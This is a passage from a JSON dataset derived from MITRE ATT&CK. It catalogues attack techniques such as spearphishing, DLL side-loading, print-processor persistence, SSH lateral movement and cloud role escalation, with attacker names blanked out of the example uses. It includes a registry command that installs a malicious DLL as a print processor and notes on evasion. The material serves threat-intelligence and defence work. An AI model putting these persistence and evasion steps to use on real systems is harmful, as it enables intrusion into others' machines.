      "can create launchers via an InstallUtil XML file to install new Grunt listeners."
    ],
    "description": "Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe and C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe.InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute [System.ComponentModel.RunInstaller(true)]. (Citation: LOLBAS Installutil)",
    "similar_words": [
      "InstallUtil"
    ],
    "id": "T1218.004"
  },
  "attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230": {
    "name": "Spearphishing Link",
    "example_uses": [
      "has sent e-mails with malicious links to credential harvesting websites.",
      "has delivered web bugs to profile their intended targets.",
      "has crafted spearphishing emails with hyperlinks designed to trick unwitting recipients into revealing their account credentials.",
      "has used links in e-mails to direct victims to credential harvesting websites designed to appear like the targeted organization's login page.",
      "can send phishing emails containing malicious links designed to collect users credentials.",
      "has used web beacons in e-mails to track hits to attacker-controlled URL's.",
      "has used malicious links to direct users to web pages designed to harvest credentials.",
      "has used links in e-mail to steal account information.",
      "has used SMS and email messages with links designed to steal credentials or track victims.",
      "has been delivered via malicious links in phishing emails.",
      "has conducted credential phishing campaigns with embedded links to attacker-controlled domains.",
      "has used spearphishing with PDF attachments containing malicious links that redirected to credential harvesting websites.",
      "has used embedded image tags (known as web bugs) with unique per-recipient tracking links in their emails for the purpose of identifying which recipients opened messages.",
      "has used links in e-mail to steal account information including web beacons for target profiling.",
      "has conducted credential phishing campaigns with links that redirect to credential harvesting sites.",
      "has sent emails to establish rapport with targets eventually sending messages with links to credential-stealing sites.",
      "used spearphishing messages containing items such as tracking pixels to determine if users interacted with malicious messages.",
      "used malicious links to adversary-controlled resources for credential harvesting."
    ],
    "description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an @ symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)Adversaries may also embed tracking pixels, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP)Adversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)Adversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)Adversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as quishing). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a users mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobiles smaller form factor.From the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
    "similar_words": [
      "Spearphishing Link"
    ],
    "id": "T1598.003"
  },
  "attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6": {
    "name": "SSH",
    "example_uses": [
      "has used SSH to move laterally through victim environments.",
      "used SSH and the PuTTy PSCP utility to gain access to a restricted segment of a compromised network.",
      "used ssh for internal reconnaissance.",
      "During  threat actors used SSH for lateral movement.",
      "During the  campaign  relied on encrypted SSH-based tunnels to transfer tools and for remote command/program execution.",
      "has used Putty for remote access.",
      "contains modules for executing commands over SSH as well as in-memory VNC agent injection.",
      "can SSH to a remote service.",
      "uses Putty for lateral movement.",
      "has used SSH for lateral movement.",
      "has used the PuTTY and Plink tools for lateral movement.",
      "has used SSH to connect back to victim machines.  has also used SSH to transfer tools and payloads onto victim hosts and execute them.",
      "has used Putty to access compromised systems.",
      "has used SSH for lateral movement in compromised environments including for enabling access to ESXi host servers.",
      "has remotely accessed compromised environments via secure shell (SSH) for lateral movement.",
      "has used Putty Secure Copy Client (PSCP) to transfer data.",
      "has spread its coinminer via SSH.",
      "used secure shell (SSH) to move laterally among their targets.",
      "used SSH with captured user credentials to move laterally in victim environments.",
      "can communicate using SSH through an HTTP tunnel.",
      "has used OpenSSH to establish an SSH tunnel to victims for persistent access.",
      "has modified the loopback address on compromised switches and used them as the source of SSH connections to additional devices within the target environment allowing them to bypass access control lists (ACLs).",
      "used SSH brute force techniques to move laterally within victim environments during ."
    ],
    "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. On ESXi, SSH can be enabled either directly on the host (e.g., via `vim-cmd hostsvc/enable_ssh`) or via vCenter.(Citation: Sygnia ESXi Ransomware 2025)(Citation: TrendMicro ESXI Ransomware)(Citation: Sygnia Abyss Locker 2025) The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the users public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user (i.e., [SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004)).",
    "similar_words": [
      "SSH"
    ],
    "id": "T1021.004"
  },
  "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3": {
    "name": "Additional Cloud Roles",
    "example_uses": [
      "During   used IAM manipulation to gain persistence and to assume or elevate privileges.",
      "During the   granted `company administrator` privileges to a newly created service principle.",
      "During   used IAM manipulation to gain persistence and to assume or elevate privileges. has also assigned user access admin roles in order to gain Tenant Root Group management permissions in Azure.",
      "has added the global admin role to accounts they have created in the targeted organization's cloud instances."
    ],
    "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)(Citation: Microsoft O365 Admin Roles) This account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.For example, in AWS environments, an adversary with appropriate permissions may be able to use the CreatePolicyVersion API to define a new version of an IAM policy or the AttachUserPolicy API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)In some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
    "similar_words": [
      "Additional Cloud Roles"
    ],
    "id": "T1098.003"
  },
  "attack-pattern--2de47683-f398-448f-b947-9abcc3e32fad": {
    "name": "Print Processors",
    "example_uses": [
      "can drop itself in C:\\Windows\\System32\\spool\\prtprocs\\x64\\winprint.dll to be loaded automatically by the spoolsv Windows service.",
      "has added the Registry key `HKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\Windows x64\\Print Processors\\UDPrint /v Driver /d spool.dll /f` to load malware as a Print Processor.",
      "The  installer has modified the Registry key HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors to install  as a Print Processor."
    ],
    "description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors)Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the AddPrintProcessor API call with an account that has SeLoadDriverPrivilege enabled. Alternatively, a print processor can be registered to the print spooler service by adding the HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver Registry key that points to the DLL.For the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the GetPrintProcessorDirectory API call, or referenced via a relative path from this directory.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020)The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",
    "similar_words": [
      "Print Processors"
    ],
    "id": "T1547.012"
  },
  "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597": {
    "name": "Spearphishing Attachment",
    "example_uses": [
      "has sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations. Attachment types have included .rtf .doc .xls archives containing LNK files and password protected archives containing .exe and .scr executables.",
      "has been distributed via spearphishing emails with malicious attachments.",
      "has sent spearphishing emails containing malicious attachments in the form of PDFs Word documents JavaScript files and Control Panel File (CPL) executables.",
      "During the   obtained their initial foothold into many IT systems using Microsoft Office attachments delivered through phishing emails.",
      "is delivered via a malicious XLS attachment contained within a spearhpishing email.",
      "has targeted victims with spearphishing emails containing malicious Microsoft Word documents.",
      "The primary delivered mechanism for  is through email phishing messages.",
      "sent spearphishing emails that contained malicious Microsoft Office and fake installer file attachments.",
      "has targeted victims with e-mails containing malicious attachments.",
      "has been distributed via spearphishing campaigns containing malicious Mircrosoft Word documents.",
      "sent spearphishing emails containing malicious Microsoft Office and RAR attachments.",
      "has been distributed via spearphishing emails containing archive attachments with file types such as .iso .zip .img .dmg and .tar as well as through malicious documents.",
      "has sent emails with malicious Microsoft Office documents attached.",
      "has sent spearphishing emails with attachment to harvest credentials and deliver malware.",
      "used spearphishing emails with malicious Microsoft Word attachments to infect victims.",
      "has sent emails to intended victims with malicious MS Word and Excel attachments.",
      "has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients.",
      "has sent malicious Office documents via email as part of spearphishing campaigns as well as executables disguised as documents.",
      "was distributed via malicious Word documents.",
      "has been delivered via spearphishing attachments disguised as PDF documents.",
      "has used e-mail to deliver malicious attachments to victims.",
      "has delivered spearphishing emails with malicious attachments to targets.",
      "has been distributed to victims through malicious e-mail attachments.",
      "has been distributed through spearphishing emails with malicious attachments.",
      "has sent spearphishing emails with a malicious executable disguised as a document or spreadsheet.",
      "has sent spearphishing emails with malicious RAR and .LNK attachments.",
      "has sent spearphishing emails with a malicious RTF document or Excel spreadsheet.",
      "has used spearphishing emails with an attachment to deliver files with exploits to initial victims.",
      "has been delivered through spearphishing emails.",
      "has been distributed through malicious e-mail attachments.",
      "has used weaponized documents attached to spearphishing emails for reconnaissance and initial compromise.",
      "During  the threat actors likely used spearphishing emails to send malicious Microsoft Word documents.",
      "has been delivered to victims via emails with malicious HTML attachments.",
      "conducted an e-mail thread-hijacking campaign with malicious ISO attachments.",
      "has used personalized spearphishing attachments.",
      "has been delivered by sending victims a phishing email containing a malicious .docx file.",
      "has sent emails with malicious attachments to gain initial access.",
      "has delivered malicious Microsoft Office attachments via spearphishing emails.",
      "has delivered zero-day exploits and malware to victims via targeted emails containing malicious attachments.",
      "For  security researchers assessed the threat actors likely used a phishing campaign to distribute a weaponized attachment to victims.",
      "has sent spearphishing e-mails with archive attachments.",
      "has been delivered via phishing emails with malicious attachments.",
      "has sent phishing emails with malicious Microsoft Word and PDF attachments.",
      "has used spearphishing with an attachment to deliver files with exploits to initial victims.",
      "has sent spearphishing attachments with password protected ZIP files.",
      "has used spearphishing attachments to distribute its malware.",
      "sent spearphishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims.",
      "has sent spearphishing emails containing malicious attachments.",
      "has been delivered to victim's machines through malicious e-mail attachments.",
      "has been distributed via spearphishing as an email attachment.",
      "has been distributed via malicious Microsoft Office documents within spam emails.",
      "has crafted and sent victims malicious attachments to gain initial access.",
      "has been delivered via malicious e-mail attachments.",
      "During  the threat actors sent spearphishing emails that contained a malicious Microsoft Word document.",
      "has been distributed within a malicious Excel attachment via spearphishing emails.",
      "has been distributed as a malicious attachment within an email.",
      "has targeted victims using spearphishing emails with malicious Microsoft Word attachments.",
      "has used spearphishing e-mails with malicious password-protected archived files (ZIP or RAR) to deliver malware.",
      "sent emails to victims with malicious Microsoft Office documents attached.",
      "has sent spearphishing emails with malicious attachments including .rtf .doc and .xls files.",
      "delivered spearphishing emails with malicious documents PDFs or Excel files attached.",
      "has been delivered to victims through malicious e-mail attachments.",
      "has been distributed in e-mails with malicious Excel or Word documents.",
      "has been delivered via spearphishing e-mails with password protected ZIP files.",
      "has used malicious e-mail attachments to deliver malware.",
      "has sent emails with malicious Microsoft Office documents and PDFs attached.",
      "is delivered via a malicious Word document inside a zip file.",
      "sent spearphishing emails with malicious attachments in RTF and XLSM formats to deliver initial exploits.",
      "has been delivered via spearphishing emails that contain a malicious Hangul Office or Microsoft Word document.",
      "During   sent malicious attachments via email to student targets in India.",
      "During  the threat actors sent phishing emails that included a PDF document that in some cases led to the download and execution of malware.",
      "has used spearphishing emails with malicious DOC attachments.",
      "has conducted spearphishing campaigns containing malicious documents to lure victims to open the attachments.",
      "has sent spearphishing emails containing malicious .zip files.",
      "has sent spearphishing emails with malicious hta file attachments.",
      "During   sent emails with malicious attachments to gain unauthorized access to targets' computers.",
      "has been delivered as malicious email attachments.",
      "has distributed targeted emails containing Word documents with embedded malicious macros.",
      "has targeted victims with spearphishing emails containing malicious attachments.",
      "has used spam emails weaponized with archive or document files as its initial infection vector.",
      "has used spearphishing attachments to deliver initial access payloads.",
      "has been delivered via malicious Word documents and archive files.",
      "has sent spearphising emails with malicious attachments to potential victims using compromised and/or spoofed email accounts.",
      "has been distributed via malicious e-mail attachments including MS Word Documents.",
      "has been delivered by phishing emails containing malicious Microsoft Excel attachments.",
      "has been distributed via spearphishing campaigns containing malicious Microsoft Word documents.",
      "has been delivered via spearphishing campaigns through a malicious Word document.",
      "has sent spearphishing e-mails with attachments to deliver malicious payloads.",
      "can be distributed through emails with malicious attachments from a spoofed email address.",
      "has been delivered via phishing e-mails with malicious attachments.",
      "has been delivered via spearphishing emails that contain a malicious zip file.",
      "has used emails containing Word Excel and/or HWP (Hangul Word Processor) documents in their spearphishing campaigns.",
      "has delivered spearphishing emails that contain a zipped file with malicious contents.",
      "has spread through emails with malicious attachments.",
      "has used spearphishing emails containing attachments (which are often stolen legitimate documents sent from compromised accounts) with embedded malicious macros.",
      "has been delivered via spearsphishing emails.",
      "has used spearphishing attachments to deliver Microsoft documents containing macros or PDFs containing malicious links to download either  Bokbot  or .",
      "has been distributed as a malicious attachment within a spearphishing email.",
      "has gained execution through luring users into opening malicious attachments.",
      "has been distributed as malicious attachments within spearphishing emails.",
      "has conducted spearphishing campaigns that included malicious Word or Excel attachments.",
      "has sent phishing emails with malicious attachments for initial access including MS Word documents.",
      "has been distributed via a malicious Word document within a spearphishing email.",
      "has delivered payloads via spearphishing attachments.",
      "has been delivered via spearphishing attachments.",
      "has sent e-mails with malicious attachments often crafted for specific targets.",
      "has been delivered by phishing emails containing attachments.",
      "has used spearphishing emails with malicious attachments to initially compromise victims.",
      "sent spearphishing emails with either malicious Microsoft Documents or RTF files attached.",
      "delivers malware using spearphishing emails with malicious HWP attachments.",
      "has been distributed via spearphishing emails usually containing a malicious RTF or Excel attachment.",
      "has been delivered as malicious e-mail attachments.",
      "has been delivered to victims as a malicious email attachment.",
      "has sent emails with malicious DOCX CHM LNK and ZIP attachments.",
      "has been distributed via spearphishing as an email attachment.",
      "has been delivered by phishing emails containing malicious Microsoft Office documents.",
      "sent spearphishing emails containing malicious password-protected RAR attachments.",
      "has sent spearphishing emails containing malicious attachments.",
      "has conducted spearphishing campaigns using malicious email attachments.",
      "has sent spearphishing emails with password-protected RAR archives containing malicious Excel Web Query files (.iqy). The group has also sent spearphishing emails that contained malicious Microsoft Office documents that use the attachedTemplate technique to load a template from a remote server.",
      "has sent phishing emails with malicious Microsoft Word attachments to victims.",
      "has been spread via e-mail campaigns utilizing malicious attachments.",
      "has sent spearphishing emails with attachments to victims as its primary initial access vector.",
      "has attached a malicious document to an email to gain initial access.",
      "has used spearphishing emails with password protected RAR attachment to avoid being detected by the email gateway.",
      "leveraged spearphishing emails with malicious attachments to initially compromise victims.",
      "has been delivered via spearphishing emails with Microsoft Office attachments.",
      "sent emails with malicious Microsoft Office documents attached.",
      "has used an email with an Excel sheet containing a malicious macro to deploy the malware",
      "uses a variety of file formats such as Microsoft Office documents ZIP archives PDF documents and other items as phishing attachments for initial access.",
      "has delivered malicious Microsoft Office and ZIP file attachments via spearphishing emails.",
      "has been distributed through reply-chain phishing emails with malicious attachments.",
      "has used phishing emails with malicious files to gain initial access.",
      "leverages malicious attachments delivered via email for initial access activity.",
      "attached password-protected ZIP archives to deliver  installers.",
      "has sent emails with malicious .pdf files to spread malware.",
      "delivered various payloads to victims as spearphishing attachments.",
      "has used phishing with malicious attachments for initial access to victim environments.",
      "has been distributed as a spearphishing attachment.",
      "has been delivered as a phishing attachment including PDFs with embedded links Word and Excel files and various archive files (ZIP RAR ACE and ISOs) containing EXE payloads.",
      "leveraged malicious attachments in spearphishing emails for initial access to victim environments in .",
      "has been delivered through phishing emails with malicious attachments."
    ],
    "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
    "similar_words": [
      "Spearphishing Attachment"
    ],
    "id": "T1566.001"
  },
  "attack-pattern--2f41939b-54c3-41d6-8f8b-35f1ec18ed97": {
    "name": "Stripped Payloads",
    "example_uses": [
      "has used run-only Applescripts a compiled and stripped version of  to remove human readable indicators to evade detection.",
      "is a stripped binary payload."
    ],
    "description": "Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating systems `linker` when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.(Citation: Mandiant golang stripped binaries explanation)(Citation: intezer stripped binaries elf files 2018)Adversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of [AppleScript](https://attack.mitre.org/techniques/T1059/002), to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.(Citation: SentinelLabs reversing run-only applescripts 2021)",
    "similar_words": [
      "Stripped Payloads"
    ],
    "id": "T1027.008"
  },
  "attack-pattern--2f6b4ed7-fef1-44ba-bcb8-1b4beb610b64": {
    "name": "Component Object Model",
    "example_uses": [
      "can use DCOM (targeting the 127.0.0.1 loopback address) to execute additional payloads on compromised hosts.",
      "used COM to setup scheduled task for persistence.",
      "can use the ITaskService ITaskDefinition and ITaskSettings COM interfaces to schedule a task.",
      "can use com objects identified with `CLSID_ShellLink`(`IShellLink` and `IPersistFile`) and `WScript.Shell`(`RegWrite` method) to enable persistence mechanisms.",
      "has used malware that has the capability to execute malicious code via COM DCOM and Outlook.",
      "droppers have used COM objects to execute the malware's full executable payload.",
      "can use a COM component to generate scheduled tasks.",
      "malware can insert malicious macros into documents using a Microsoft.Office.Interop object.",
      "can execute files on remote machines using DCOM.",
      "has used the `WshShortcut` COM object to create a .lnk shortcut file in the Windows startup folder.",
      "can use the Internet Explorer (IE) COM interface to connect and receive commands from C2.",
      "can use a COM object to execute queries to gather system information.",
      "can use the Windows COM API to schedule tasks and maintain persistence.",
      "can use the `IARPUinstallerStringLauncher` COM interface are part of its UAC bypass process.",
      "can use the Windows Component Object Model (COM) to set scheduled tasks.",
      "creates an elevated COM object for CMLuaUtil and uses this to set a registry value that points to the malicious LNK file during execution.",
      "can insert malicious shellcode into Excel.exe using a `Microsoft.Office.Interop` object."
    ],
    "description": "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)",
    "similar_words": [
      "Component Object Model"
    ],
    "id": "T1559.001"
  },
  "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34": {
    "name": "DLL",
    "example_uses": [
      "has used search order hijacking to launch  Beacons.",
      "has used search order hijacking to force TeamViewer to load a malicious DLL.",
      "abuses a legitimate and signed Microsoft executable to launch a malicious DLL.",
      "abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary VPDN_LU.exe to load a malicious DLL that mimics a legitimate Symantec DLL navlu.dll.",
      "Variants of  achieve persistence by using DLL search order hijacking usually by copying the DLL file to %SYSTEMROOT% (C:\\WINDOWS\\ntshrui.dll).",
      "has used  to load oci.dll as a persistence mechanism.",
      "has used search order hijacking to run the loader Vcrodat.",
      "A  variant uses DLL search order hijacking.",
      "has used DLL search-order hijacking to load `exe` `dll` and `dat` files into memory.",
      "is launched through use of DLL search order hijacking to load a malicious dll.",
      "has the ability to use DLL search order hijacking for installation on targeted systems.",
      "can hijack outdated Windows application dependencies with malicious versions of its own DLL payload.",
      "has used the malware variant TerraTV to load a malicious DLL placed in the TeamViewer directory instead of the original Windows DLL located in a system folder.",
      "uses DLL search order hijacking for persistence by saving itself as ntshrui.dll to the Windows directory so it will load before the legitimate ntshrui.dll saved in the System32 subdirectory.",
      "can launch itself via DLL Search Order Hijacking.",
      "can use DLL hijacking to bypass security controls.",
      "is likely loaded via DLL hijacking into a legitimate McAfee binary.",
      "contains a collection of Privesc-PowerUp modules that can discover and exploit DLL hijacking opportunities in services and processes.",
      "loader has used DLL Search Order Hijacking to load malicious code instead of the legitimate `version.dll` during the `Microsoft.IdentityServer.ServiceHost.exe` execution process.",
      "has performed DLL hijacking before execution.",
      "can persist via DLL search order hijacking on Google Chrome Mozilla Firefox or Microsoft OneDrive.",
      "has used search order hijacking to load a malicious DLL.",
      "can be deployed to targeted systems via legitimate programs that are vulnerable to DLL search order hijacking.",
      "can be launched by using DLL search order hijacking in which the wrapper DLL is placed in the same folder as explorer.exe and loaded during startup into the Windows Explorer process instead of the legitimate library.",
      "has performed DLL search order hijacking to execute their payload.",
      "has executed DLL search order hijacking.",
      "has exploited the loading of the legitimate Dwrite.dll file by actually loading the gdi library which then loads the gdiplus library and ultimately loads the local Dwrite dll.",
      "contains modules that can discover and exploit various DLL hijacking opportunities.",
      "has used search order hijacking to load a malicious payload DLL as a dependency to a benign application packaged in the same ISO.",
      "uses search order hijacking of the Windows executable sysprep.exe to escalate privileges.",
      "has used search order hijacking to execute malicious payloads such as Winnti RAT.",
      "has used DLL search order hijacking.",
      "has used DLL search-order hijacking to load `exe` `dll` and `dat` files into memory.  loaded a malicious DLL into the legitimate Windows Security Health Service executable (SecurityHealthService.exe) to execute malicious code on victim systems.",
      "involved the use of DLL search order hijacking to execute .",
      "has used search order hijacking to execute malicious payloads such as .",
      "has used side loading to place malicious DLLs in memory.",
      "has used search order hijacking to launch  Beacons.  has also abused legitimate executables to side-load weaponized DLLs.",
      "can use a digitally signed binary (Logitech Bluetooth Wizard Host Process) to load its dll into memory.",
      "maintains persistence on victim networks through side-loading dlls to trick legitimate programs into running malware.",
      "can abuse legitimate Windows executables to side-load malicious DLL files.",
      "has used malicious DLLs executed via legitimate EXE files through DLL search order hijacking to launch follow-on payloads such as .",
      "can use DLL side-loading to execute malicious payloads.",
      "A  .dll that contains  is loaded and executed using DLL side-loading.",
      "abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary VPDN_LU.exe to load a malicious DLL that mimics a legitimate Symantec DLL navlu.dll.  has also used DLL side-loading.",
      "side loads a malicious file sspisrv.dll in part of a spoofed lssas.exe service.",
      "can use DLL side-loading to load malicious DLLs into legitimate executables.",
      "typically loads its DLL file into a legitimate signed Java or VMware executable.",
      "used DLL search order hijacking on vulnerable applications to install  payloads during .",
      "uses DLL side-loading to load malicious programs. A  variant also uses DLL search order hijacking.",
      "has used a legitimate application to sideload a DLL to decrypt decompress and run a payload.",
      "used DLL side-loading to covertly load  into memory on the victim machine.",
      "s JavaScript file used a legitimate Microsoft Office 2007 package to side-load the OINFO12.OCX dynamic link library.",
      "has side-loaded its malicious DLL file.",
      "has used DLL side loading to import and load a malicious DLL loader.",
      "has used DLL side-loading to load malicious payloads.",
      "ran legitimately-signed executables from Symantec and McAfee which load a malicious DLL. The group also side-loads its backdoor by dropping a library and a legitimate signed executable (AcroTranscoder).",
      "has the ability to use DLL search order hijacking for installation on targeted systems.  has also used DLL side-loading to evade anti-virus.",
      "has deployed a malicious DLL (7z.DLL) that is sideloaded by a modified legitimate installer (7zG.exe) when that installer is executed with an additional command line parameter of `b` at runtime to load a  beacon payload.",
      "uses DLL side-loading typically using a digitally signed sample of Kaspersky Anti-Virus (AV) 6.0 for Windows Workstations or McAfee's Outlook Scan About Box to load malicious DLL files.",
      "has leveraged legitimate applications to then side-load malicious DLLs during execution.",
      "During the  installation process it drops a copy of the legitimate Microsoft binary igfxtray.exe. The executable contains a side-loading weakness which is used to load a portion of the malware.",
      "A  variant has used DLL side-loading.",
      "DLL side-loading has been used to execute  through a legitimate Citrix executable ssonsvr.exe. The Citrix executable was dropped along with  by the dropper.",
      "loaders can be side-loaded with legitimate and signed executables including the VLC.exe media player.",
      "has the ability to use DLL side-loading for execution.",
      "can use legitimate signed EXE files paired with malicious DLL files to load and run malicious payloads while bypassing defenses.",
      "has been known to side-load DLLs using a valid version of a Windows Address Book and Windows Defender executable with one of their tools.",
      "has placed a malicious payload in `%WINDIR%\\SYSTEM32\\oci.dll` so it would be sideloaded by the MSDTC service.",
      "can use DLL side-loading to load malicious DLLs.",
      "has used legitimate executables such as `winword.exe` and `igfxem.exe` to side-load their malware.",
      "has been executed as a file named DsNcDiag.dll through side-loading.",
      "has used legitimate applications to side-load malicious DLLs.",
      "has sideloaded a DLL payload using a renamed legitimate `msinfo32.exe` executable.",
      "has been known to side load DLLs with a valid version of Chrome with one of their tools.",
      "has used DLL side loading by giving DLLs hardcoded names and placing them in searched directories.",
      "has used DLL side-loading to execute its payload.",
      "has used IISCrack.dll as a side-loading technique to load a malicious version of httpodbc.dll on old IIS Servers (CVE-2001-0507).",
      "has used a legitimately signed executable to execute a malicious payload within a DLL file.",
